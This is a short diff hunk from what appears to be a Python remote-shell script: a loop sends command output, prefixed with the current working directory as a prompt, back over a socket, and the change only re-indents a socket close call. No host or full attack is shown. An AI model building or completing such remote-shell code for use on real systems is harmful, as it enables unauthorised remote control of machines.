@@ -20,4 +20,4 @@ while True:
         output_str = str(stdout_value, 'UTF-8')
         currentWD = os.getcwd() + '>'
         conn.send((currentWD + output_str).encode('UTF-8')
-                  s.close()
+    s.close()
